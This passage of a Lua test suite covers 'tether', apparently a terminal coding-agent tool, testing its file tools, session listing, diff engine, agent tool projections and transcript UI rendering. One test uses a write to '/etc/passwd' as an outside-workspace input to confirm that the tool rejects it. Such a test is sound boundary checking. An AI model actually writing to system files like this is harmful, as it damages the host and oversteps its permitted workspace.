  for i = 1, 600 do dirs[ws .. "/big"][i] = ("f%03d.txt"):format(i) end

  _G.tether = host_mock{
    getcwd = function() return ws end,
    realpath = function(p) return (p:gsub("/+$", "")) end,
    readdir = function(p)
      local d = dirs[p]
      if not d then return nil, "no such directory" end
      local out = {}
      for i, n in ipairs(d) do out[i] = n end
      table.sort(out)
      return out
    end,
    stat = function(p)
      if dirs[p] then return { mtime = 1, size = 0, is_dir = true } end
      if p:match("%.[a-z]+$") then return { mtime = 1, size = 3, is_dir = false } end
      return nil, "no such file"
    end,
    krep_search = function(base, pattern, glob, ignore_case, gitignore, max)
      last_krep = { base = base, pattern = pattern, glob = glob,
                    ignore_case = ignore_case, gitignore = gitignore, max = max }
      -- the C host returns krep's printed records as {path, line, column, text}
      return {
        { path = ws .. "/a.txt", line = 1, column = 1, text = "needle one" },
        { path = ws .. "/sub/b.lua", line = 7, column = 1, text = "needle two" },
      }
    end,
  }
  local tools = assert(loadfile("src/tether/tools.lua"))()
  local cfg = { workspace = ws }

  -- list: sorted root entries with a count; a sub-directory path is accepted
  local l = tools.list({}, cfg)
  assert_eq(l.count, 3, "T113 list counts the workspace root")
  assert_eq(l.entries[1], "a.txt", "T113 list entries are sorted")
  assert_eq(l.entries[3], "sub", "T113 list covers the whole root")
  local l2 = tools.list({ path = "sub" }, cfg)
  assert_eq(l2.count, 2, "T113 list accepts a sub-directory")
  assert_eq(l2.entries[1], "b.lua", "T113 sub-directory entries sorted")

  -- glob: recursive walk, relative sorted paths, `**` crosses directories
  local g = tools.glob({ pattern = "**/*.lua" }, cfg)
  assert_eq(g.count, 2, "T113 glob ** finds nested .lua files")
  assert_eq(g.files[1], "sub/b.lua", "T113 glob returns workspace-relative paths")
  assert_eq(g.files[2], "sub/deep/c.lua", "T113 glob descends into sub-tree")
  local g2 = tools.glob({ pattern = "*.txt" }, cfg)
  assert_eq(g2.files[1], "a.txt", "T113 glob matches the basename")
  local g3 = tools.glob({ path = "big", pattern = "*.txt" }, cfg)
  assert_eq(g3.count, 500, "T113 glob caps 600 matches at 500")

  -- grep: one in-process krep_search call, records kept workspace-relative
  local r = tools.grep({ pattern = "needle", max_results = 5 }, cfg)
  assert_eq(r.count, 2, "T113 grep returns the krep records")
  assert_eq(r.matches[1].path, "a.txt", "T113 grep path is workspace-relative")
  assert_eq(r.matches[1].line, 1, "T113 grep carries the line number")
  assert_eq(r.matches[1].column, 1, "T113 grep column is 1 (krep prints none)")
  assert_eq(r.matches[1].text, "needle one", "T113 grep carries the line text")
  assert_eq(r.matches[2].path, "sub/b.lua", "T113 grep keeps nested paths")
  assert_eq(last_krep.pattern, "needle", "T113 pattern reaches krep")
  assert_eq(last_krep.max, 5, "T113 max_results reaches krep")
  assert_eq(last_krep.base, ws, "T113 search base is the workspace")
  assert_true(last_krep.gitignore == true, "T113 .gitignore honored by default")
  tools.grep({ pattern = "x", ignore_case = true, glob = "*.py" }, cfg)
  assert_true(last_krep.ignore_case == true, "T113 ignore_case reaches krep")
  assert_eq(last_krep.glob, "*.py", "T113 glob filter reaches krep")
  _G.tether = orig
  print("T113 list/glob/grep on in-process primitives: OK")
end

-- T114 (1.6): session listing enumerates *.jsonl through tether.readdir, orders
-- by mtime descending and keeps only the 100 most recent files, exposing the
-- recency rank as `mtime`.
do
  local orig = _G.tether
  local ws = "/tmp/tether_t114_ws"
  local dir = "/tmp/tether_t114_sessions"
  os.execute("rm -rf " .. dir .. " && mkdir -p " .. dir)
  local names, mtimes = {}, {}
  for i = 1, 105 do
    local id = ("s%03d"):format(i)
    local name = id .. ".jsonl"
    names[#names + 1] = name
    mtimes[name] = i -- s105 is the newest
    local f = assert(io.open(dir .. "/" .. name, "w"))
    f:write('{"ts":"2026-01-01T00:00:00","type":"session_start",'
            .. '"meta":{"workspace":"' .. ws .. '","model":"m"}}\n')
    f:write('{"ts":"2026-01-01T00:00:01","type":"message","role":"user",'
            .. '"content":"hi"}\n')
    f:close()
  end
  _G.tether = host_mock{
    readdir = function(p)
      if p ~= dir then return nil, "no such directory" end
      local out = {}
      for i, n in ipairs(names) do out[i] = n end
      table.sort(out)
      return out
    end,
    stat = function(p)
      local name = p:match("([^/]+)$")
      if p:sub(1, #dir) ~= dir or mtimes[name] == nil then return nil, "missing" end
      return { mtime = mtimes[name], size = 1, is_dir = false }
    end,
  }
  local session = assert(loadfile("src/tether/session.lua"))()
  session._session_dir = dir
  local files = session.session_files(ws)
  assert_eq(#files, 100, "T114 listing keeps the 100 most recent")
  assert_eq(files[1].id, "s105", "T114 newest session first")
  assert_eq(files[1].mtime, 1, "T114 mtime is the recency rank")
  assert_eq(files[2].id, "s104", "T114 ordered by mtime descending")
  assert_eq(files[100].id, "s006", "T114 the oldest fall off the cap")
  assert_eq(files[1].first_line, "hi", "T114 first user message is the preview")
  session._session_dir = nil
  _G.tether = orig
  os.execute("rm -rf " .. dir)
  print("T114 session listing order/cap: OK")
end

-- === pretty-transcript-rendering: diff engine (tasks 1.1-1.5) ============
do
  local d = assert(loadfile("src/tether/diff.lua"))()

  -- 1.1 new file: all additions, +N -0
  local t1, c1 = d.unified("", "a\nb\nc\n", "a/x", "b/x")
  assert_eq(c1.add, 3, "1.1 new file add count")
  assert_eq(c1.del, 0, "1.1 new file del count")
  assert_true(t1:find("@@ -0,0 +1,3 @@", 1, true) ~= nil, "1.1 new file hunk header")
  assert_true(t1:find("^+a$") ~= nil or t1:find("\n+a\n", 1, true) ~= nil, "1.1 new file addition")

  -- 1.1 overwrite keeps surrounding context
  local t2, c2 = d.unified("l1\nl2\nl3\nl4\nl5\n", "l1\nl2\nl3\nX\nl5\n", "a/x", "b/x")
  assert_eq(c2.add, 1, "1.1 overwrite add")
  assert_eq(c2.del, 1, "1.1 overwrite del")
  assert_true(t2:find("\n l3\n", 1, true) ~= nil, "1.1 context line kept")
  assert_true(t2:find("-l4", 1, true) ~= nil, "1.1 removed line")
  assert_true(t2:find("+X", 1, true) ~= nil, "1.1 added line")

  -- 1.1 identical input -> empty diff
  local t3, c3 = d.unified("x\ny\n", "x\ny\n")
  assert_eq(t3, "", "1.1 identical -> empty diff")
  assert_eq(c3.add, 0, "1.1 identical add 0")
  assert_eq(c3.del, 0, "1.1 identical del 0")

  -- 1.2 parse a multi-file diff
  local multi = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n-old\n+new\n"
             .. "--- a/y\n+++ b/y\n@@ -3,2 +3,3 @@\n ctx\n+ins\n ctx2\n"
  local rows = d.parse(multi)
  assert_notnil(rows, "1.2 parse multi-file")
  local add_rows, hunk_count, file_count = 0, 0, 0
  for _, r in ipairs(rows) do
    if r.kind == "add" then add_rows = add_rows + 1 end
    if r.kind == "hunk-header" then hunk_count = hunk_count + 1 end
    if r.kind == "file-header" then file_count = file_count + 1 end
  end
  assert_eq(hunk_count, 2, "1.2 two hunks")
  assert_eq(file_count, 4, "1.2 four file headers")
  -- hunk without explicit counts: `@@ -1 +1 @@` means one old / one new line
  local first_add, first_rem
  for _, r in ipairs(rows) do
    if r.kind == "add" and not first_add then first_add = r end
    if r.kind == "remove" and not first_rem then first_rem = r end
  end
  assert_eq(first_rem and first_rem.old, 1, "1.2 hunk-without-counts old line number")
  assert_eq(first_add and first_add.new, 1, "1.2 hunk-without-counts new line number")
  local second_add
  for _, r in ipairs(rows) do
    if r.kind == "add" and r.new == 4 then second_add = r end
  end
  assert_notnil(second_add, "1.2 add line number from hunk header")

  -- 1.2 no-newline marker is recognised, not fatal
  local marker = "@@ -1,1 +1,1 @@\n-a\n+b\n\\ No newline at end of file\n"
  local mrows = d.parse(marker)
  assert_notnil(mrows, "1.2 no-newline diff parses")
  local saw_marker = false
  for _, r in ipairs(mrows) do if r.kind == "no-newline" then saw_marker = true end end
  assert_true(saw_marker, "1.2 no-newline row emitted")

  -- 1.2 non-diff text -> nil
  assert_eq(d.parse("hello\nworld"), nil, "1.2 plain text is not a diff")
  assert_eq(d.parse(""), nil, "1.2 empty text is not a diff")

  -- 1.3 only-changed-word pairing
  local oseg, nseg = d.pair_words({ text = "foo(a, 1)" }, { text = "foo(a, 2)" })
  assert_notnil(oseg, "1.3 paired only-changed-word")
  local function changed_text(segs)
    local out = {}
    for _, s in ipairs(segs) do if s.changed then out[#out + 1] = s.text end end
    return table.concat(out)
  end
  assert_eq(changed_text(oseg), "1)", "1.3 old changed word")
  assert_eq(changed_text(nseg), "2)", "1.3 new changed word")
  assert_eq(d.pair_words({ text = "alpha beta" }, { text = "gamma delta" }), nil,
    "1.3 dissimilar pair not paired")
  local longline = string.rep("x ", 300)
  assert_eq(d.pair_words({ text = longline }, { text = longline .. "y" }), nil,
    "1.3 over-long line skips comparison")
  assert_eq(d.pair_words({ text = "one two" }, { text = "one" }), nil,
    "1.3 unequal runs not paired")

  -- 1.4 meter
  local a12, d12 = d.meter(12, 3)
  assert_true(a12 >= 1 and d12 >= 1, "1.4 +12 -3 both sides")
  assert_true(a12 > d12, "1.4 +12 -3 added side longer")
  local a34, d34 = d.meter(34, 0)
  assert_true(a34 > 0 and d34 == 0, "1.4 +34 -0 added only")
  local a05, d05 = d.meter(0, 5)
  assert_true(a05 == 0 and d05 > 0, "1.4 +0 -5 removed only")

  -- 1.5 module is callable through dofile
  assert_true(type(d.unified) == "function" and type(d.parse) == "function"
    and type(d.pair_words) == "function" and type(d.meter) == "function",
    "1.5 diff module exports full API")
  print("1.1-1.5 diff engine: OK")
end

-- === pretty-transcript-rendering: agent (tasks 2.1-2.5) =================
do
  local ws = "/tmp/tether_ptr_ws"
  os.execute("rm -rf " .. ws .. " && mkdir -p " .. ws)
  local diffmod = assert(loadfile("src/tether/diff.lua"))()
  local pc = assert(loadfile("src/tether/providers/common.lua"))()

  local saved = {}
  for _, n in ipairs({"tether","config","session","api","agent","context","tools","diff","provider_common"}) do
    saved[n] = _G[n]
  end

  local function fresh()
    _G.tether = host_mock{
      realpath = function(p) return (p:gsub("/+$", "")) end,
      getcwd = function() return ws end,
      exec = function() return true, 0 end,
    }
    _G.config = { get_system_prompt = function() return nil end }
    _G.session = { append = function() end }
    _G.tools = assert(loadfile("src/tether/tools.lua"))()
    _G.diff = diffmod
    _G.provider_common = pc
    local a = assert(loadfile("src/tether/agent.lua"))()
    _G.agent = a
    return a
  end

  local function scripted(steps)
    local n = 0
    return function(cfg, key, hist, cb)
      n = n + 1
      local s = steps[n]
      if not s then return true end
      for _, ev in ipairs(s) do cb(ev) end
      return true
    end
  end

  local function write_file(name, content)
    local f = assert(io.open(ws .. "/" .. name, "w")); f:write(content); f:close()
  end
  local function read_file(name)
    local f = io.open(ws .. "/" .. name, "r")
    if not f then return nil end
    local d = f:read("*a"); f:close(); return d
  end
  local function cfg() return { workspace = ws, context = {}, _session_id = "s" } end
  local function turn_events(a)
    local starts, results = {}, {}
    a.turn(cfg(), "k", "go", function(e)
      if e.type == "tool_call_start" then starts[#starts + 1] = e end
      if e.type == "tool_result" then results[#results + 1] = e end
    end)
    return starts, results
  end

  -- 2.1 + 2.3 write carries args, body is the applied diff, history matches
  do
    write_file("w.txt", "l1\nl2\nl3\n")
    local a = fresh()
    _G.api = { stream = scripted({
      { { type = "tool_call_start", id = "c1", name = "write" },
        { type = "tool_call_delta", id = "c1", arguments = pc.json_encode({ path = "w.txt", content = "l1\nX\nl3\n" }) } },
      { { type = "text_delta", text = "done" } },
    }) }
    local starts, results = turn_events(a)
    assert_eq(starts[1] and starts[1].args and starts[1].args.path, "w.txt", "2.1 tool_call_start carries args")
    local proj = starts[1] and starts[1].projection
    assert_notnil(proj, "2.2 write event carries projection")
    assert_eq(proj.kind, "overwrite", "2.2 projection kind overwrite")
    assert_true(proj.diff:find("-l2", 1, true) ~= nil and proj.diff:find("+X", 1, true) ~= nil,
      "2.2 projection diff describes change")
    local res = results[1]
    assert_notnil(diffmod.parse(res.body), "2.3 write body is a diff")
    assert_true(res.summary:find("+1", 1, true) ~= nil and res.summary:find("−1", 1, true) ~= nil,
      "2.3 write summary +N −M")
    assert_true(res.summary:find("перезаписан", 1, true) ~= nil, "2.3 write summary overwritten")
    local hist
    for _, m in ipairs(a.get_history()) do if m.role == "tool" then hist = m.content end end
    assert_eq(hist, res.body, "2.3 history body equals UI body")
  end

  -- 2.2 new file projects a creation diff
  do
    local a = fresh()
    _G.api = { stream = scripted({
      { { type = "tool_call_start", id = "c2", name = "write" },
        { type = "tool_call_delta", id = "c2", arguments = pc.json_encode({ path = "new.txt", content = "a\nb\n" }) } },
      { { type = "text_delta", text = "ok" } },
    }) }
    local starts = turn_events(a)
    local proj = starts[1] and starts[1].projection
    assert_eq(proj and proj.kind, "new", "2.2 new file projection kind")
    assert_true(proj.diff:find("@@ -0,0 +1,2 @@", 1, true) ~= nil, "2.2 new file creation diff")
  end

  -- 2.2 patch projects the submitted diff; 2.3 body is that diff
  do
    write_file("p.txt", "a\nb\n")
    local patchstr = "--- a/p.txt\n+++ b/p.txt\n@@ -1,2 +1,2 @@\n a\n-b\n+B\n"
    local a = fresh()
    _G.api = { stream = scripted({
      { { type = "tool_call_start", id = "c3", name = "patch" },
        { type = "tool_call_delta", id = "c3", arguments = pc.json_encode({ patch = patchstr }) } },
      { { type = "text_delta", text = "ok" } },
    }) }
    local starts, results = turn_events(a)
    local proj = starts[1] and starts[1].projection
    assert_eq(proj and proj.kind, "patch", "2.2 patch projection kind")
    assert_eq(proj.add, 1, "2.2 patch add count")
    assert_eq(proj.del, 1, "2.2 patch del count")
    assert_true(results[1].body:find("+B", 1, true) ~= nil, "2.3 patch body is the diff")
  end

  -- 2.2 oversized / outside-workspace / non-write tools: no projection, no read
  do
    write_file("big.txt", string.rep("z\n", 600000))
    local helper = fresh()
    local before = read_file("big.txt")
    local c = { workspace = ws }
    assert_eq(helper._projection_for("write", { path = "big.txt", content = "x" }, c), nil,
      "2.2 oversized target: no projection")
    assert_eq(read_file("big.txt"), before, "2.2 oversized target file unchanged")
    assert_eq(helper._projection_for("write", { path = "/etc/passwd", content = "x" }, c), nil,
      "2.2 outside workspace: no projection")
    assert_eq(helper._projection_for("read", { path = "big.txt" }, c), nil,
      "2.2 other tools: no projection")
  end

  -- 2.4 oversized previous content falls back to the written path, no counts
  do
    write_file("big2.txt", string.rep("z\n", 600000))
    local a = fresh()
    _G.api = { stream = scripted({
      { { type = "tool_call_start", id = "c4", name = "write" },
        { type = "tool_call_delta", id = "c4", arguments = pc.json_encode({ path = "big2.txt", content = "small\n" }) } },
      { { type = "text_delta", text = "ok" } },
    }) }
    local _, results = turn_events(a)
    assert_eq(results[1].body, "big2.txt", "2.4 oversized fallback body is the path")
    assert_true(results[1].summary:find("−", 1, true) == nil, "2.4 fallback summary has no diff counts")
    assert_true(results[1].summary:find("B", 1, true) ~= nil, "2.4 fallback summary keeps byte form")
  end

  -- 2.4 a failed call keeps its error body and error summary
  do
    write_file("p2.txt", "a\nb\n")
    local bad = "--- a/p2.txt\n+++ b/p2.txt\n@@ -1,2 +1,2 @@\n x\n-y\n+Y\n"
    local a = fresh()
    _G.api = { stream = scripted({
      { { type = "tool_call_start", id = "c5", name = "patch" },
        { type = "tool_call_delta", id = "c5", arguments = pc.json_encode({ patch = bad }) } },
      { { type = "text_delta", text = "ok" } },
    }) }
    local _, results = turn_events(a)
    assert_notnil(results[1].error, "2.4 failed call reports error")
    assert_true(results[1].body:find("conflict", 1, true) ~= nil, "2.4 error body is kept")
    assert_true(results[1].summary:find("✗", 1, true) ~= nil, "2.4 error summary uses the failure marker")
  end

  -- 2.5 other tools keep their body/summary; truncation still applies
  do
    local a = fresh()
    _G.api = { stream = scripted({
      { { type = "tool_call_start", id = "c6", name = "run" },
        { type = "tool_call_delta", id = "c6", arguments = pc.json_encode({ command = "echo hi" }) } },
      { { type = "text_delta", text = "ok" } },
    }) }
    local _, results = turn_events(a)
    assert_true(results[1].summary:find("exit", 1, true) ~= nil, "2.5 run summary unchanged")

    local a2 = fresh()
    local bigout = string.rep("L", 20000)
    _G.tools.run = function() return { output = bigout, exit_code = 0, elapsed_ms = 1 } end
    _G.api = { stream = scripted({
      { { type = "tool_call_start", id = "c7", name = "run" },
        { type = "tool_call_delta", id = "c7", arguments = pc.json_encode({ command = "x" }) } },
      { { type = "text_delta", text = "ok" } },
    }) }
    turn_events(a2)
    local hist
    for _, m in ipairs(a2.get_history()) do if m.role == "tool" then hist = m.content end end
    assert_true(hist and hist:find("truncated", 1, true) ~= nil, "2.5 TOOL_BODY_MAX truncation still applies")
  end

  for _, n in ipairs({"tether","config","session","api","agent","context","tools","diff","provider_common"}) do
    _G[n] = saved[n]
  end
  os.execute("rm -rf " .. ws)
  print("2.1-2.5 agent projection/diff bodies: OK")
end

-- === pretty-transcript-rendering: UI rows/expansion/diffs (3.1-4.6) ====
do
  local diffmod = assert(loadfile("src/tether/diff.lua"))()

  local uimod, S = run_ui_with({ 17 }, {})
  local strip = uimod.strip_sgr
  local function boot()
    local m, st = run_ui_with({ 17 }, {})
    return m, st
  end
  local function set_tools(m, st, list)
    m._transcript.reset({})
    st.expand_all = false
    st.scroll = 0
    st.user_scrolled = false
    for _, e in ipairs(list) do
      e.role = "tool"
      m._transcript.append(e)
    end
    m._invalidate_all()
    return m._transcript.entries()
  end

  -- 3.1 status marker + clipped first error line
  do
    local m, st = boot()
    local e = set_tools(m, st, { { name = "read", status = "ok", summary = "214 стр.", body = "abc" } })[1]
    assert_true(strip(m._render_all(80)[1]):find("✓ read", 1, true) ~= nil,
      "3.1 success row leads with the done glyph")
    local f = set_tools(m, st, { { name = "run", status = "error", summary = "✗ boom1",
      body = "boom1\nboom2\nboom3\nboom4" } })[1]
    local rows = m._render_all(60)
    assert_eq(#rows, 1, "3.1 failed row occupies exactly one row")
    assert_true(strip(rows[1]):find("✗ run", 1, true) == 1, "3.1 failed row starts with ✗ run")
    assert_true(strip(rows[1]):find("boom1", 1, true) ~= nil, "3.1 first error line visible")
    assert_true(strip(rows[1]):find("boom2", 1, true) == nil, "3.1 later error lines hidden")
    assert_true(m.vlen(rows[1]) <= 60, "3.1 failed row stays within the width")
    f.expand_state = "expanded"
    m._invalidate_all()
    assert_true(strip(table.concat(m._render_all(60), "\n")):find("boom4", 1, true) ~= nil,
      "3.1 full error behind expansion")
    f.expand_state = nil
    m._ascii_mode = true
    m._invalidate_all()
    assert_true(strip(m._render_all(80)[1]):find("[x] run", 1, true) ~= nil,
      "3.1 ascii failure marker")
    m._ascii_mode = nil
  end

  -- 3.2 sanitize_output
  do
    local m, st = boot()
    local s = m.sanitize_output("abc\27[2K\27]0;title\7def\r\nghi\rj")
    assert_true(s:find("\27", 1, true) == nil, "3.2 no escape sequence survives")
    assert_true(s:find("title", 1, true) == nil, "3.2 OSC dropped")
    assert_true(s:find("\r", 1, true) == nil, "3.2 carriage returns dropped")
    assert_eq(s, "abcdef\nghij", "3.2 visible text only")
    assert_eq(m.sanitize_output("a\27[31mb\27[0m"), "a\27[31mb\27[0m", "3.2 SGR survives while colour on")
    m._ascii_mode = true
    assert_eq(m.sanitize_output("a\27[31mb\27[0m"), "ab", "3.2 colour off strips SGR")
    m._ascii_mode = nil
    assert_eq(m.sanitize_output("a\n\n\n\nb"), "a\n\nb", "3.2 blank-line runs collapse")
    local e = set_tools(m, st, { { name = "run", status = "ok", summary = "exit 0",
      body = "x\27[2Ky\r" } })[1]
    local before = e.body
    m._invalidate_all()
    m._render_all(80)
    assert_eq(e.body, before, "3.2 stored body stays raw")
  end

  -- 3.3 per-entry / all-entries expansion
  do
    local m, st = boot()
    st.kb_protocol = 1
    local list = set_tools(m, st, {
      { name = "read", status = "ok", summary = "1 стр.", body = "a" },
      { name = "read", status = "ok", summary = "2 стр.", body = "b" },
    })
    m._handle_key({ kind = "ctrl", code = 15, shift = false })
    assert_eq(list[2].expand_state, "expanded", "3.3 ctrl+o toggles the newest visible entry")
    assert_eq(list[1].expand_state, nil, "3.3 the older entry is untouched")
    assert_eq(m.transcript_height(80), #m._render_all(80), "3.3 height exact after per-entry toggle")
    m._handle_key({ kind = "ctrl", code = 15, shift = true })
    assert_eq(st.expand_all, true, "3.3 ctrl+shift+o expands all")
    assert_eq(list[1].expand_state, nil, "3.3 ctrl+shift+o clears per-entry state")
    assert_eq(list[2].expand_state, nil, "3.3 ctrl+shift+o clears per-entry state (2)")
    st.kb_protocol = 0
    m._handle_key({ kind = "ctrl", code = 15, shift = false })
    assert_eq(st.expand_all, false, "3.3 plain terminal keeps ctrl+o = expand-all")
  end

  -- 3.3 ctrl+o with no tool row in the viewport falls back to the newest tool
  do
    local m, st = boot()
    st.kb_protocol = 1
    m._transcript.reset({ { role = "tool", name = "read", status = "ok", summary = "1 стр.", body = "a" } })
    for i = 1, 60 do
      m._transcript.append({ role = "system", text = "row " .. i })
    end
    m._invalidate_all()
    st.scroll = 10
    st.user_scrolled = true
    m._handle_key({ kind = "ctrl", code = 15, shift = false })
    assert_eq(m._transcript.entries()[1].expand_state, "expanded",
      "3.3 ctrl+o falls back to the newest tool when the viewport holds none")
  end

  -- 3.4 click toggling under ui.mouse = "on" / "auto"
  do
    local m, st = boot()
    st.cfg.ui = st.cfg.ui or {}
    st.cfg.ui.mouse = "on"
    local e = set_tools(m, st, { { name = "grep", status = "ok", summary = "1 совп.", body = "a" } })[1]
    m._handle_key({ kind = "mouse", name = "press", row = 1, col = 1, button = 0 })
    assert_eq(e.expand_state, "expanded", "3.4 click toggles the entry")
    st.cfg.ui.mouse = "auto"
    e.expand_state = nil
    m._invalidate_all()
    m._handle_key({ kind = "mouse", name = "press", row = 1, col = 1, button = 0 })
    assert_eq(e.expand_state, nil, "3.4 auto mode delivers no transcript click")
  end

  -- 3.5 keymap documents the new bindings
  do
    assert_notnil(uimod.KEYMAP["ctrl+shift+o"], "3.5 ctrl+shift+o documented")
    assert_true(uimod.KEYMAP["ctrl+o"]:find("tool", 1, true) ~= nil, "3.5 ctrl+o documents the per-entry toggle")
  end

  -- 4.1 tool body highlighting
  do
    local m, st = boot()
    st.cfg.ui = st.cfg.ui or {}
    st.cfg.ui.highlight = "on"
    local e = set_tools(m, st, { { name = "read", status = "ok", summary = "1 стр.",
      body = "1\tlocal x = 1 -- comment", path = "src/a.lua", expand_state = "expanded" } })[1]
    local on = m._render_all(80)
    assert_true(table.concat(on):find("\27[", 1, true) ~= nil, "4.1 lua read body is coloured")
    st.cfg.ui.highlight = "off"
    m._invalidate_all()
    local off = m._render_all(80)
    st.cfg.ui.highlight = "on"
    m._invalidate_all()
    local on2 = m._render_all(80)
    assert_eq(#on2, #off, "4.1 strip-equality: same row count")
    for i = 1, #on2 do
      assert_eq(strip(on2[i]), strip(off[i]), "4.1 strip equals plain row " .. i)
      assert_eq(m.vlen(on2[i]), m.vlen(off[i]), "4.1 identical geometry row " .. i)
    end
    set_tools(m, st, { { name = "read", status = "ok", summary = "1 стр.",
      body = "1\tlocal x", path = "a.xyz", expand_state = "expanded" } })
    local urows = m._render_all(80)
    local ubody = {}
    for i = 2, #urows do ubody[#ubody + 1] = urows[i] end
    assert_true(table.concat(ubody):find("\27[", 1, true) == nil,
      "4.1 unknown extension stays plain")
    set_tools(m, st, { { name = "run", status = "ok", summary = "exit 0",
      body = "local x = 1", expand_state = "expanded" } })
    local rrows = m._render_all(80)
    local rbody = {}
    for i = 2, #rrows do rbody[#rbody + 1] = rrows[i] end
    assert_true(table.concat(rbody):find("\27[", 1, true) == nil,
      "4.1 run body stays plain")
    set_tools(m, st, { { name = "grep", status = "ok", summary = "2 совп.", expand_state = "expanded",
      body = "a.lua:1: local x = 1\nb.json:1: {\"a\":1}" } })
    assert_true(table.concat(m._render_all(80)):find("\27[", 1, true) ~= nil,
      "4.1 grep rows follow their own paths")
  end

  -- 4.2 write/patch rendered as a unified diff, plain fallback
  do
    local m, st = boot()
    st.cfg.ui = st.cfg.ui or {}
    st.cfg.ui.highlight = "on"
    local dtxt = diffmod.unified("l1\nl2\nl3\nl4\nl5\n", "l1\nl2\nl3\nX\nl5\n", "a/w.lua", "b/w.lua")
    set_tools(m, st, { { name = "write", status = "ok", summary = "+1 −1 перезаписан",
      body = dtxt, path = "w.lua", expand_state = "expanded" } })
    local joined = table.concat(m._render_all(80), "\n")
    assert_true(strip(joined):find("+X", 1, true) ~= nil, "4.2 added line rendered")
    assert_true(strip(joined):find("-l4", 1, true) ~= nil, "4.2 removed line rendered")
    assert_true(joined:find("\27[", 1, true) ~= nil, "4.2 diff coloured")
    set_tools(m, st, { { name = "write", status = "ok", summary = "+1 B",
      body = "just text", path = "w.txt", expand_state = "expanded" } })
    assert_true(strip(table.concat(m._render_all(80), "\n")):find("just text", 1, true) ~= nil,
      "4.2 non-diff body renders as plain text")
  end

  -- 4.3 word-level emphasis and mono degradation
  do
    local m, st = boot()
    st.cfg.ui = st.cfg.ui or {}
    st.cfg.ui.highlight = "on"
    local dtxt = diffmod.unified("local foo = 1\n", "local foo = 2\n")
    set_tools(m, st, { { name = "write", status = "ok", summary = "+1 −1 перезаписан",
      body = dtxt, path = "w.lua", expand_state = "expanded" } })
    local joined = table.concat(m._render_all(80), "")
    assert_true(joined:find("\27[2m", 1, true) ~= nil, "4.3 carried words rendered muted")
    m.set_theme("mono")
    m._invalidate_all()
    assert_true(table.concat(m._render_all(80), ""):find("\27[", 1, true) == nil,
      "4.3 mono theme renders without emphasis or escapes")
    m.set_theme("default")
    -- over-long line skips emphasis; row still one per line
    local long = string.rep("x ", 300)
    local dtxt2 = diffmod.unified(long .. "\n", long .. "y\n")
    set_tools(m, st, { { name = "write", status = "ok", summary = "+1 −1 перезаписан",
      body = dtxt2, path = "w.lua", expand_state = "expanded" } })
    assert_true(table.concat(m._render_all(80), ""):find("\27[", 1, true) ~= nil,
      "4.3 over-long diff still renders")
  end

  -- 4.4 summary meter
  do
    local m, st = boot()
    set_tools(m, st, { { name = "write", status = "ok", summary = "+12 −3 перезаписан", path = "w.lua" } })
    local head = strip(m._render_all(80)[1])
    assert_true(head:find("+12 −3", 1, true) ~= nil, "4.4 summary counts")
    assert_true(head:find("━", 1, true) ~= nil, "4.4 meter present")
    set_tools(m, st, { { name = "write", status = "ok", summary = "+34 −0 создан", path = "n.lua" } })
    assert_true(strip(m._render_all(80)[1]):find("━", 1, true) ~= nil, "4.4 created meter present")
    m._ascii_mode = true
    m._invalidate_all()
    assert_true(strip(m._render_all(80)[1]):find("#", 1, true) ~= nil, "4.4 ascii meter uses #")
    m._ascii_mode = nil
  end

  -- 4.5 pending projection, result replacement and denial drop
  do
    local m, st = boot()
    local proj = { path = "w.lua", kind = "overwrite", diff = "@@ -1 +1 @@\n-a\n+b\n", add = 1, del = 1 }
    local e = set_tools(m, st, { { id = "x", name = "write", status = "pending", summary = "",
      body = proj.diff, projection = proj, path = "w.lua" } })[1]
    assert_true(strip(m._render_all(80)[1]):find("write", 1, true) ~= nil, "4.5 pending row rendered")
    e.expand_state = "expanded"
    m._invalidate_all()
    assert_true(strip(table.concat(m._render_all(80), "\n")):find("+b", 1, true) ~= nil,
      "4.5 pending projection is expandable")
    set_tools(m, st, { { id = "x", name = "write", status = "pending", summary = "",
      body = proj.diff, projection = proj, path = "w.lua" } })
    m._handle_agent_event({ type = "tool_result", id = "x", name = "write",
      summary = "+1 −1 перезаписан", body = "NEWBODY" })
    assert_eq(tentries(m)[1].body, "NEWBODY", "4.5 result replaces the preview")
    assert_eq(tentries(m)[1].projection, nil, "4.5 projection cleared on result")
    set_tools(m, st, { { id = "y", name = "write", status = "pending", summary = "",
      body = proj.diff, projection = proj, path = "w.lua" } })
    m._handle_agent_event({ type = "tool_result", id = "y", name = "write",
      error = "denied by user", summary = "✗ denied by user", body = "denied by user" })
    assert_eq(tentries(m)[1].body, "", "4.5 denied call drops the preview/result body")
    assert_eq(tentries(m)[1].projection, nil, "4.5 denied call clears the projection")
  end

  -- 4.6 virtualization invariants with the new row shapes
  do
    local m, st = boot()
    st.cfg.ui = st.cfg.ui or {}
    st.cfg.ui.highlight = "on"
    local old = string.rep("line\n", 50)
    local new = string.rep("line\n", 49) .. "CHANGED\n"
    local dtxt = diffmod.unified(old, new)
    local e = set_tools(m, st, { { name = "write", status = "ok", summary = "+1 −1 перезаписан",
      body = dtxt, path = "w.lua" } })[1]
    assert_eq(m.transcript_height(80), #m._render_all(80), "4.6 collapsed parity")
    e.expand_state = "expanded"
    m._touch_entry(e)
    assert_eq(m.transcript_height(80), #m._render_all(80), "4.6 per-entry toggle keeps parity")
    assert_true(m.cache_rows() <= math.max(4 * (st.h - 6), 1024) + 64, "4.6 large diff respects the cache bound")
  end

  print("3.1-4.6 UI rows/expansion/diffs: OK")
end

-- T82 (2.1): the palette window helper is pure — at most 8 rows and at most
-- half the terminal height, never below one, with the offset keeping the
-- selected row inside the window.
do
  local ui = dofile("src/tether/ui.lua")
  local function inside(h, n, sel)
    local w, o = ui._palette_window(h, n, sel)
    return sel >= o and sel <= o + w - 1
  end
  assert_eq(ui._palette_window(24, 20, 1), 8, "T82 window capped at 8 rows")
  assert_eq(ui._palette_window(12, 20, 1), 6, "T82 half the terminal shrinks the window")
  assert_eq(ui._palette_window(24, 3, 2), 3, "T82 a short list fits its own window")
  assert_eq(ui._palette_window(24, 0, 1), 0, "T82 no entries, no window")
  assert_eq(ui._palette_window(1, 5, 3), 1, "T82 the window never drops below one row")
  assert_true(inside(24, 20, 1), "T82 selection stays inside (first)")
  assert_true(inside(24, 20, 10), "T82 selection stays inside (middle)")
  assert_true(inside(24, 20, 20), "T82 selection stays inside (last)")
  assert_true(inside(12, 20, 7), "T82 selection stays inside on a short terminal")
  local _, o = ui._palette_window(24, 20, 10)
  assert_true(o > 1, "T82 the window shifts off the first entry")
  print("T82 2.1 palette window: OK")
end

if failed > 0 then
    os.exit(1)
end

